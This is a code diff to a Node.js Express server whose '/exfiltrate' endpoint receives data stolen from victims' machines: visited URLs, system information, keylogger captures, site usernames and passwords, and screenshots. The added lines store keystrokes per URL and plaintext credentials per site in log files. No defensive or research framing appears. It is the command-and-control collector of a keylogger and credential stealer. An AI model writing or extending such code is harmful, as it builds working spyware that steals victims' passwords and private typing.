@@ -40,27 +40,58 @@ app.post('/exfiltrate', (req, res) => {
 
             const csvHeader = "receivedAt, url\n";
             const csvContent = links.map(link => `${link.receivedAt.toISOString()}, ${link.url}`).join("\n");
-            const filePath = path.join(__dirname, "csv/urls.csv");
+            const filePath = path.join(__dirname, "csv/urls/urls.csv");
             fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");
             break;
         case 'os':
             console.log("Keylogger updated");
             system_info = data;
+
+            const osFilePath = path.join(__dirname, "/csv/os.json");
+            const osData = {
+                receivedAt: new Date().toISOString(),
+                osInfo: system_info
+            };
+            fs.writeFileSync(osFilePath, JSON.stringify(osData, null, 2), "utf8");
             break;
 
         case 'keys':
             console.log("Keylogger updated");
             keylogger_info = data;
+
+            const logFilePath = path.join(__dirname, "/csv/keylogger/keylogger.log");
+            let logContent = "";
+
+            for (const [url, entries] of Object.entries(keylogger_info)) {
+                logContent += `${url}:\n`;
+                entries.forEach(entry => {
+                    logContent += `[${entry.timestamp}] ${entry.text}\n`;
+                });
+                logContent += "\n";
+            }
+
+            fs.appendFileSync(logFilePath, logContent, "utf8");
             break;
 
        case 'credentials':
             console.log("credentials recorded");
             credentials = data;
+
+            const credFilePath = path.join(__dirname, "csv/credentials/credentials.log");
+            let credContent = "";
+
+            for (const [site, creds] of Object.entries(credentials)) {
+                credContent += `${site}:\n`;
+                credContent += `Username: ${creds.username}\n`;
+                credContent += `Password: ${creds.password}\n\n`;
+            }
+
+            fs.appendFileSync(credFilePath, credContent, "utf8");
             break;
 
        case 'screenshot':
             const base64Data = data.replace(/^data:image\/png;base64,/, "");
-            const ss_path = path.join(__dirname, "/csv/images", `screenshot_${Date.now()}.png`);
+            const ss_path = path.join(__dirname, "csv/images", `screenshot_${Date.now()}.png`);
 
             fs.writeFile(ss_path, base64Data, "base64", (err) => {
                 if (err) {
